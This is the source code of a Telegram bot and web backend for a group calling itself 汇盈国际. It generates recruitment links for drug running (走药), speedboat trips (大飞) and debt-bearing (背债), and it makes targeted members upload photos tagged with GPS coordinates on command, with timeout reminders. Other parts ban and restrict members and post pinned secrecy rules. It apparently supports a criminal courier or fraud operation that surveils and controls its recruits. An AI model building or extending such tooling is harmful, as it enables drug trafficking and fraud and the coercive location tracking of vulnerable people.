const { Telegraf } = require('telegraf');
const fs = require('fs');
const express = require('express');

// 初始化
const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();

// 群组配置
const GROUP_CHAT_IDS = [
  -1003354803364, -1003381368112, -1003308598858, -1003368574609, 
  -1003286063197, -1003378109615, -1003293673373, -1003203365614,
  -1000000000009, -1000000000010
];
const BACKUP_GROUP_ID = -1003293673373;
const WEB_APP_URL = 'https://huiying8.netlify.app';

// CORS中间件
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// 状态管理
const pendingTasks = new Map();
const AUTH_FILE = './authorized.json';
let authorizedUsers = new Map();
const warningMessages = new Map();
const unauthorizedMessages = new Map();
const zlMessages = new Map();

// 链接配置
const ZL_LINKS = {
  '租车': 'https://che88.netlify.app',
  '大飞': 'https://fei88.netlify.app',
  '走药': 'https://yao88.netlify.app',
  '背债': 'https://bei88.netlify.app'
};
const ZJ_LINKS = {
  '租车': 'https://zjc88.netlify.app',
  '大飞': 'https://zjf88.netlify.app',
  '走药': 'https://zjy88.netlify.app',
  '背债': 'https://zjb88.netlify.app'
};
const INITIAL_TEXT = '填写招聘申请时请打开手机录屏，按照上面顺序排列填写资料后拍照关闭手机录屏后发送到群里！';

// 授权管理
function loadAuth() {
    try {
        const data = fs.readFileSync(AUTH_FILE, 'utf8');
        const parsed = JSON.parse(data);
        authorizedUsers.clear();
        for (let [key, value] of Object.entries(parsed)) {
            authorizedUsers.set(Number(key), value);
        }
        console.log('授权文件加载成功，当前授权用户数:', authorizedUsers.size);
    } catch (error) {
        console.log('授权文件不存在或加载失败，使用空Map');
    }
}

function saveAuth() {
    try {
        fs.writeFileSync(AUTH_FILE, JSON.stringify(Object.fromEntries(authorizedUsers)));
    } catch (error) {
        console.error('保存授权失败:', error);
    }
}

loadAuth();

function factoryReset() {
    authorizedUsers.clear();
    pendingTasks.clear();
    warningMessages.clear();
    unauthorizedMessages.clear();
    zlMessages.clear();
    try {
        fs.unlinkSync(AUTH_FILE);
        console.log('出厂设置完成: 所有状态清空，授权文件已删除');
    } catch (error) {
        console.error('删除授权文件失败:', error);
    }
}

// 发送消息到群组
async function sendToChat(chatId, photoBuffer, caption, lat, lng) {
    try {
        await bot.telegram.sendPhoto(chatId, { source: photoBuffer }, {
            caption,
            parse_mode: 'Markdown'
        });
        if (lat && lng) {
            await bot.telegram.sendLocation(chatId, parseFloat(lat), parseFloat(lng));
        }
        console.log(`✅ 成功发送到群组 ${chatId}`);
        return true;
    } catch (error) {
        console.error(`发送到群组 ${chatId} 失败:`, error.message);
        return false;
    }
}

// 管理员检查
async function isAdmin(chatId, userId) {
    try {
        const member = await bot.telegram.getChatMember(chatId, userId);
        return member.status === 'administrator' || member.status === 'creator';
    } catch (error) {
        return false;
    }
}

// ==================== 修复上传接口 ====================
app.post('/upload', express.raw({type: '*/*', limit: '50mb'}), async (req, res) => {
  console.log('📸 收到上传请求');
  
  try {
    // 获取整个请求体
    const buffer = req.body;
    
    if (!buffer || buffer.length < 100) {
      console.log('❌ 无效的图片数据');
      return res.status(400).json({ code: 1, msg: '无效的图片数据' });
    }

    // 从查询参数获取数据
    const { lat, lng, name = '汇盈用户', time, chatid } = req.query;
    
    console.log('📋 上传参数:', { lat, lng, name, time, chatid, bufferSize: buffer.length });

    if (!lat || !lng) {
      console.log('❌ 缺少经纬度参数');
      return res.status(400).json({ code: 1, msg: '缺少经纬度' });
    }

    const formattedTime = time 
      ? new Date(parseInt(time)).toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' })
      : new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });

    const caption = `【H5拍照上传】\n用户：${name}\n时间：${formattedTime}\n位置：${parseFloat(lat).toFixed(6)}, ${parseFloat(lng).toFixed(6)}\n高德地图：https://amap.com/dir?destination=${lng},${lat}\n谷歌地图：https://www.google.com/maps?q=${lat},${lng}`;

    console.log(`📤 准备发送照片，chatid: ${chatid}`);

    let success = false;

    // 发送到指定群组
    if (chatid && GROUP_CHAT_IDS.includes(Number(chatid))) {
      console.log(`📤 发送到来源群组: ${chatid}`);
      const sent = await sendToChat(Number(chatid), buffer, caption, lat, lng);
      if (sent) success = true;
    }

    // 发送到备份群组
    console.log(`📤 发送到备份群组: ${BACKUP_GROUP_ID}`);
    const backupSent = await sendToChat(BACKUP_GROUP_ID, buffer, `[备份] ${caption}`, lat, lng);
    if (backupSent) success = true;

    if (success) {
      console.log('✅ 照片上传和处理完成');
      res.json({ code: 0, msg: 'success' });
    } else {
      throw new Error('所有群组发送失败');
    }

  } catch (err) {
    console.error('❌ H5上传失败:', err);
    res.status(500).json({ code: 1, msg: err.message });
  }
});

// 健康检查
app.get('/', (req, res) => {
    res.json({ 
        status: 'online', 
        message: '汇盈国际 Bot 服务运行正常 🚀',
        timestamp: new Date().toISOString(),
        groups: GROUP_CHAT_IDS.length
    });
});

app.get('/test', (req, res) => {
    res.json({ 
        code: 0, 
        message: '后端服务正常运行',
        groups: GROUP_CHAT_IDS.length,
        uploadEndpoint: '/upload'
    });
});

// ==================== Bot 命令处理 ====================

bot.use(async (ctx, next) => {
    if (ctx.message && ctx.chat?.type === 'private') {
        const userId = ctx.from.id;
        const userName = ctx.from.first_name || '未知用户';
        const userUsername = ctx.from.username ? `@${ctx.from.username}` : '无用户名';
        const messageText = ctx.message.text || '[非文本消息]';
        const timestamp = new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
        
        try {
            await ctx.reply('❌ 🔒 本机器人只供汇盈国际内部使用，你没有权限访问。如果有疑问，请联系汇盈国际负责人授权。🚫');
            const reportText = `🚨 **私信访问警报** 🚨\n\n用户: ${userName} ${userUsername}\nID: ${userId}\n消息: ${messageText}\n时间: ${timestamp}`;
            await bot.telegram.sendMessage(BACKUP_GROUP_ID, reportText, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('私信处理失败:', error);
        }
        return;
    }
    await next();
});

// 帮助命令
bot.command('bz', (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    
    const helpText = `📋 汇盈国际机器人指令面板\n\n` +
        `🔹 /hc - 🚗 换车安全确认拍照 (授权用户专用)\n` +
        `🔹 /boss - Boss要求指定用户拍照 (负责人专用)\n` +
        `🔹 /lg - 龙哥要求指定用户拍照 (负责人专用)\n` +
        `🔹 /zl - 招聘申请链接生成 (负责人专用)\n` +
        `🔹 /zj - 招聘申请链接生成-中介 (负责人专用)\n` +
        `🔹 /qc - 🗑️ 彻底恢复出厂 (负责人专用)\n` +
        `🔹 /lh - 🚫 踢出用户 (负责人专用)\n` +
        `🔹 /lj - 🔗 生成群组邀请链接 (负责人专用)\n` +
        `🔹 /bz - 📖 显示此说明 (所有用户可用)`;
    ctx.reply(helpText, { parse_mode: 'Markdown' });
});

// 邀请链接命令
bot.command('lj', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) {
        const noPermMsg = await ctx.reply('❌ 🔒 无权限！ /lj 只限汇盈国际负责人使用。');
        unauthorizedMessages.set(noPermMsg.message_id, { userId: ctx.from.id, userName: ctx.from.first_name || '用户' });
        return;
    }
    
    try {
        const inviteLink = await bot.telegram.exportChatInviteLink(chatId);
        ctx.reply(`🔗 汇盈国际官方对接群链接\n\n点击下方按钮直接加入：`, {
            reply_markup: {
                inline_keyboard: [[{ text: '👉 点击加入群', url: inviteLink }]]
            }
        });
    } catch (error) {
        ctx.reply('❌ 生成链接失败！检查 Bot 权限。');
        console.error('邀请链接生成失败:', error);
    }
});

// 清空命令
bot.command('qc', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) {
        const noPermMsg = await ctx.reply('❌ 🔒 无权限！ /qc 只限汇盈国际负责人使用。');
        unauthorizedMessages.set(noPermMsg.message_id, { userId: ctx.from.id, userName: ctx.from.first_name || '用户' });
        return;
    }
    
    ctx.reply(`🗑️ 开始清空群聊记录...`);
    
    let deletedCount = 0;
    const startMessageId = ctx.message.message_id;
    
    for (let i = 1; i <= 100; i++) { // 限制删除数量，避免超时
        try {
            await bot.telegram.deleteMessage(chatId, startMessageId - i);
            deletedCount++;
            await new Promise(resolve => setTimeout(resolve, 100));
        } catch (error) {
            break;
        }
    }
    
    const resetMsg = await ctx.reply(`🔄 一键出厂设置确认\n\n⚠️ 此操作将清空所有授权数据和记录\n点击确认：`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: '✅ 确认重置', callback_data: 'qc_reset_yes' }],
                [{ text: '❌ 取消', callback_data: 'qc_reset_no' }]
            ]
        }
    });
});

// 招聘链接命令
bot.command('zl', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) {
        const noPermMsg = await ctx.reply('❌ 🔒 无权限！ /zl 只限汇盈国际负责人使用。');
        unauthorizedMessages.set(noPermMsg.message_id, { userId: ctx.from.id, userName: ctx.from.first_name || '用户' });
        return;
    }
    
    let targetUserId, targetFirstName, targetUsername;
    const replyTo = ctx.message.reply_to_message;
    
    if (replyTo) {
        targetUserId = replyTo.from.id;
        targetFirstName = replyTo.from.first_name || '未知';
        targetUsername = replyTo.from.username ? `@${replyTo.from.username}` : '无用户名';
    } else {
        const match = ctx.message.text.match(/@(\w+)/);
        if (match) {
            const username = match[1];
            try {
                const user = await bot.telegram.getChat(`@${username}`);
                targetUserId = user.id;
                targetFirstName = user.first_name || '未知';
                targetUsername = `@${username}`;
            } catch (error) {
                return ctx.reply(`❌ 用户 @${username} 不存在！`);
            }
        } else {
            return ctx.reply('👆 请@用户或回复消息指定');
        }
    }
    
    const replyMsg = await ctx.reply(`${INITIAL_TEXT}\n\n请选择申请类型：`, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '租车', callback_data: 'zl_租车' },
                    { text: '大飞', callback_data: 'zl_大飞' }
                ],
                [
                    { text: '走药', callback_data: 'zl_走药' },
                    { text: '背债', callback_data: 'zl_背债' }
                ]
            ]
        }
    });
    zlMessages.set(replyMsg.message_id, { targetUserId, targetFirstName, targetUsername, commandType: 'zl' });
});

// 中介链接命令
bot.command('zj', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) {
        const noPermMsg = await ctx.reply('❌ 🔒 无权限！ /zj 只限汇盈国际负责人使用。');
        unauthorizedMessages.set(noPermMsg.message_id, { userId: ctx.from.id, userName: ctx.from.first_name || '用户' });
        return;
    }
    
    let targetUserId, targetFirstName, targetUsername;
    const replyTo = ctx.message.reply_to_message;
    
    if (replyTo) {
        targetUserId = replyTo.from.id;
        targetFirstName = replyTo.from.first_name || '未知';
        targetUsername = replyTo.from.username ? `@${replyTo.from.username}` : '无用户名';
    } else {
        const match = ctx.message.text.match(/@(\w+)/);
        if (match) {
            const username = match[1];
            try {
                const user = await bot.telegram.getChat(`@${username}`);
                targetUserId = user.id;
                targetFirstName = user.first_name || '未知';
                targetUsername = `@${username}`;
            } catch (error) {
                return ctx.reply(`❌ 用户 @${username} 不存在！`);
            }
        } else {
            return ctx.reply('👆 请@用户或回复消息指定');
        }
    }
    
    const replyMsg = await ctx.reply(`${INITIAL_TEXT}\n\n请选择申请类型：`, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '租车', callback_data: 'zj_租车' },
                    { text: '大飞', callback_data: 'zj_大飞' }
                ],
                [
                    { text: '走药', callback_data: 'zj_走药' },
                    { text: '背债', callback_data: 'zj_背债' }
                ]
            ]
        }
    });
    zlMessages.set(replyMsg.message_id, { targetUserId, targetFirstName, targetUsername, commandType: 'zj' });
});

// 回调查询处理
bot.on('callback_query', async (ctx) => {
    const data = ctx.callbackQuery.data;
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    
    const msgId = ctx.callbackQuery.message.message_id;
    
    // 处理招聘链接
    if (data.startsWith('zl_') || data.startsWith('zj_')) {
        const commandType = data.startsWith('zl_') ? 'zl' : 'zj';
        const buttonKey = data.split('_')[1];
        const stored = zlMessages.get(msgId);
        
        if (!stored || stored.commandType !== commandType) {
            await ctx.answerCbQuery('❌ 无效操作！');
            return;
        }
        
        const links = commandType === 'zl' ? ZL_LINKS : ZJ_LINKS;
        const link = links[buttonKey];
        const { targetUserId, targetFirstName, targetUsername } = stored;
        
        const userInfo = `TG名字: ${targetFirstName}\nTG用户名: ${targetUsername}\nID: ${targetUserId}`;
        const instruction = commandType === 'zl' ?
            '点击链接打开浏览器填写，填写时记住要录屏！填写好了发到此群！' :
            '发给客户让客户打开浏览器填写，填写时记住要录屏！填写好了发到此群！';
        
        const newText = `${INITIAL_TEXT}\n\n👤 ${userInfo}\n\n🔗 申请链接： [点击进入网站](${link})\n\n\`复制链接: ${link}\`\n\n${instruction}`;
        
        await ctx.editMessageText(newText, { parse_mode: 'Markdown' });
        await ctx.answerCbQuery(`✅ 已更新为 ${buttonKey} 链接！`);
        zlMessages.delete(msgId);
        return;
    }
    
    // 处理重置确认
    const userId = ctx.from.id;
    const isUserAdmin = await isAdmin(chatId, userId);
    if (!isUserAdmin) return;
    
    if (data === 'qc_reset_yes') {
        factoryReset();
        await ctx.answerCbQuery('✅ 出厂设置执行中...');
        await ctx.editMessageText(`🚀 出厂设置完成！\n所有授权已清空，Bot 恢复初始状态。`);
    } else if (data === 'qc_reset_no') {
        await ctx.answerCbQuery('❌ 取消出厂设置');
        await ctx.editMessageText('❌ 出厂设置已取消。');
    }
});

// 踢出用户命令
bot.command('lh', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) {
        const noPermMsg = await ctx.reply('❌ 🔒 无权限！ /lh 只限汇盈国际负责人使用。');
        unauthorizedMessages.set(noPermMsg.message_id, { userId: ctx.from.id, userName: ctx.from.first_name || '用户' });
        return;
    }
    
    let targetUserId, userName;
    const replyTo = ctx.message.reply_to_message;
    
    if (replyTo) {
        targetUserId = replyTo.from.id;
        userName = replyTo.from.first_name || (replyTo.from.username ? `@${replyTo.from.username}` : '用户');
    } else {
        const match = ctx.message.text.match(/@(\w+)/);
        if (match) {
            const username = match[1];
            try {
                const user = await bot.telegram.getChat(`@${username}`);
                targetUserId = user.id;
                userName = `@${username}`;
            } catch (error) {
                return ctx.reply(`❌ 用户 @${username} 不存在！`);
            }
        } else {
            return ctx.reply('👆 请@用户或回复消息指定');
        }
    }
    
    try {
        await bot.telegram.banChatMember(chatId, targetUserId, { revoke_messages: true });
        ctx.reply(`🚫 用户 ${userName} 已踢出并永久拉黑！ (ID: ${targetUserId})`);
    } catch (error) {
        ctx.reply(`❌ 拉黑失败：${error.description}`);
    }
});

// Boss拍照命令
bot.command('boss', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) {
        const noPermMsg = await ctx.reply('❌ 🔒 无权限！ /boss 只限汇盈国际负责人使用。');
        unauthorizedMessages.set(noPermMsg.message_id, { userId: ctx.from.id, userName: ctx.from.first_name || '用户' });
        return;
    }
    
    let targetUser, targetUserId;
    const replyTo = ctx.message.reply_to_message;
    
    if (replyTo) {
        targetUser = replyTo.from.username || replyTo.from.first_name;
        targetUserId = replyTo.from.id;
    } else {
        const match = ctx.message.text.match(/@(\w+)/);
        if (match) {
            const username = match[1];
            try {
                const user = await bot.telegram.getChat(`@${username}`);
                targetUserId = user.id;
                targetUser = username;
            } catch (error) {
                return ctx.reply(`❌ 用户 @${username} 不存在！`);
            }
        } else {
            return ctx.reply('👆 请@用户或回复消息指定');
        }
    }
    
    const replyMsg = await ctx.reply(`汇盈国际负责人Boss要求你拍照，请点击下方拍照 <a href="tg://user?id=${targetUserId}">@${targetUser}</a>`, {
        reply_markup: {
            inline_keyboard: [[{ text: '📷 开始拍照', url: `${WEB_APP_URL}/?chatid=${chatId}` }]]
        },
        parse_mode: 'HTML'
    });
    
    const timeoutId = setTimeout(async () => {
        if (pendingTasks.has(replyMsg.message_id)) {
            await bot.telegram.sendMessage(chatId, `⏰ 提醒：@${targetUser}，Boss要求拍照已超时5分钟，请尽快完成！`, {
                reply_to_message_id: replyMsg.message_id
            });
            pendingTasks.delete(replyMsg.message_id);
        }
    }, 5 * 60 * 1000);
    
    pendingTasks.set(replyMsg.message_id, { targetUser, type: 'boss', timeoutId, chatId });
});

// 龙哥拍照命令
bot.command('lg', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) {
        const noPermMsg = await ctx.reply('❌ 🔒 无权限！ /lg 只限汇盈国际负责人使用。');
        unauthorizedMessages.set(noPermMsg.message_id, { userId: ctx.from.id, userName: ctx.from.first_name || '用户' });
        return;
    }
    
    let targetUser, targetUserId;
    const replyTo = ctx.message.reply_to_message;
    
    if (replyTo) {
        targetUser = replyTo.from.username || replyTo.from.first_name;
        targetUserId = replyTo.from.id;
    } else {
        const match = ctx.message.text.match(/@(\w+)/);
        if (match) {
            const username = match[1];
            try {
                const user = await bot.telegram.getChat(`@${username}`);
                targetUserId = user.id;
                targetUser = username;
            } catch (error) {
                return ctx.reply(`❌ 用户 @${username} 不存在！`);
            }
        } else {
            return ctx.reply('👆 请@用户或回复消息指定');
        }
    }
    
    const replyMsg = await ctx.reply(`汇盈国际负责人龍哥要求你拍照，请点击下方拍照 <a href="tg://user?id=${targetUserId}">@${targetUser}</a>`, {
        reply_markup: {
            inline_keyboard: [[{ text: '📷 开始拍照', url: `${WEB_APP_URL}/?chatid=${chatId}` }]]
        },
        parse_mode: 'HTML'
    });
    
    const timeoutId = setTimeout(async () => {
        if (pendingTasks.has(replyMsg.message_id)) {
            await bot.telegram.sendMessage(chatId, `⏰ 提醒：@${targetUser}，龍哥要求拍照已超时5分钟，请尽快完成！`, {
                reply_to_message_id: replyMsg.message_id
            });
            pendingTasks.delete(replyMsg.message_id);
        }
    }, 5 * 60 * 1000);
    
    pendingTasks.set(replyMsg.message_id, { targetUser, type: 'lg', timeoutId, chatId });
});

// 换车拍照命令
bot.command('hc', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    
    const userId = ctx.from.id;
    const isAuthorized = authorizedUsers.get(userId) || false;
    const isAdminUser = await isAdmin(chatId, userId);
    
    if (!isAuthorized && !isAdminUser) {
        const noPermMsg = await ctx.reply('❌ 🔒 无权限！你需授权才能使用 /hc 请联系汇盈国际负责人。');
        unauthorizedMessages.set(noPermMsg.message_id, { userId, userName: ctx.from.first_name || '用户' });
        return;
    }
    
    await ctx.reply('🚗 为了保障你的安全换车前请拍照！换车一定要是上一个司机安排的哦，如果是请点击下方拍照，如果不是请联系负责人', {
        reply_markup: {
            inline_keyboard: [[{ text: '🚗 开始拍照', url: `${WEB_APP_URL}/?chatid=${chatId}` }]]
        }
    });
});

// 新成员处理
bot.on('new_chat_members', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    
    const newMembers = ctx.message.new_chat_members.filter(member => !member.is_bot);
    
    for (const member of newMembers) {
        const userId = member.id;
        authorizedUsers.set(userId, false);
        saveAuth();
        
        try {
            await bot.telegram.restrictChatMember(chatId, userId, { permissions: { can_send_messages: false } });
        } catch (error) {
            console.error('限制新成员失败:', error);
        }
        
        const userName = member.first_name || '用户';
        const userUsername = member.username ? `@${member.username}` : '';
        
        const warningMsg = await ctx.reply(`🚫 这是汇盈国际官方对接群\n\n👤 欢迎 ${userName} ${userUsername}！\n\n⚠️ 你还没有获得授权权限，请立即联系负责人进行授权！`, { parse_mode: 'Markdown' });
        warningMessages.set(warningMsg.message_id, { userId, userName });
    }
    
    const welcomeText = `🚨 上车安全提醒 - 必读！\n\n上车以后不要跟其他人过多交流，不要透露个人信息！\n\n欢迎新成员！请注意安全出行。路上有问题及时报告到此群`;
    
    try {
        const msg = await ctx.reply(welcomeText, { parse_mode: 'Markdown' });
        await bot.telegram.pinChatMessage(chatId, msg.message_id, { disable_notification: false });
    } catch (error) {
        console.error('欢迎消息置顶失败:', error);
    }
});

// 文本消息处理
bot.on('text', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    
    const userId = ctx.from.id;
    const isAuthorized = authorizedUsers.get(userId) || false;
    const isAdminUser = await isAdmin(chatId, userId);
    
    if (!isAdminUser && !isAuthorized) {
        try {
            await bot.telegram.deleteMessage(chatId, ctx.message.message_id);
        } catch (delError) {
            // 忽略删除失败
        }
        
        const userName = ctx.from.first_name || '用户';
        const userUsername = ctx.from.username ? `@${ctx.from.username}` : '';
        
        const warningMsg = await ctx.reply(`🚫 这里是汇盈国际官方对接群\n\n👤 ${userName} ${userUsername}，你还没有获得授权！\n\n💡 立即联系负责人授权，否则无法发言。`, { parse_mode: 'Markdown' });
        warningMessages.set(warningMsg.message_id, { userId, userName });
        
        if (!isAdminUser) {
            try {
                await bot.telegram.restrictChatMember(chatId, userId, { permissions: { can_send_messages: false } });
            } catch (restrictError) {
                // 忽略限制失败
            }
        }
        return;
    }
    
    const replyTo = ctx.message.reply_to_message;
    if (isAdminUser && replyTo) {
        const text = ctx.message.text.trim();
        if (text === '授权') {
            if (warningMessages.has(replyTo.message_id)) {
                const { userId: targetUserId, userName } = warningMessages.get(replyTo.message_id);
                if (targetUserId) {
                    authorizedUsers.set(targetUserId, true);
                    saveAuth();
                    try {
                        await bot.telegram.restrictChatMember(chatId, targetUserId, { permissions: { can_send_messages: true } });
                        await ctx.reply(`✅已授权 ${userName} (ID: ${targetUserId})！\n他现在可以用 /hc 指令并且发言了`);
                        warningMessages.delete(replyTo.message_id);
                    } catch (error) {
                        ctx.reply('❌ 授权失败！检查 Bot 权限。');
                    }
                }
            } else if (unauthorizedMessages.has(replyTo.message_id)) {
                const { userId: targetUserId, userName } = unauthorizedMessages.get(replyTo.message_id);
                if (targetUserId) {
                    authorizedUsers.set(targetUserId, true);
                    saveAuth();
                    await ctx.reply(`✅已授权 ${userName} (ID: ${targetUserId})！他现在可以用 /hc 指令。`);
                    unauthorizedMessages.delete(replyTo.message_id);
                }
            }
        }
    }
});

// ==================== 启动服务 ====================

const PORT = process.env.PORT || 3000;

// 启动Express服务器
app.listen(PORT, () => {
    console.log(`🌐 Express 服务器启动成功，端口: ${PORT}`);
    console.log(`📍 健康检查: https://huiying888.onrender.com/`);
    console.log(`🧪 测试端点: https://huiying888.onrender.com/test`);
    console.log(`📸 上传端点: https://huiying888.onrender.com/upload`);
});

// 延迟启动Bot，避免冲突
setTimeout(() => {
    bot.launch().then(() => {
        console.log('🚀 Bot 启动成功！');
        console.log(`🤖 支持 ${GROUP_CHAT_IDS.length} 个群组`);
    }).catch(err => {
        console.error('❌ Bot 启动失败:', err.message);
        console.log('⚠️  Bot 功能不可用，但 Express 服务器正常运行');
    });
}, 3000);

// 优雅关闭
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
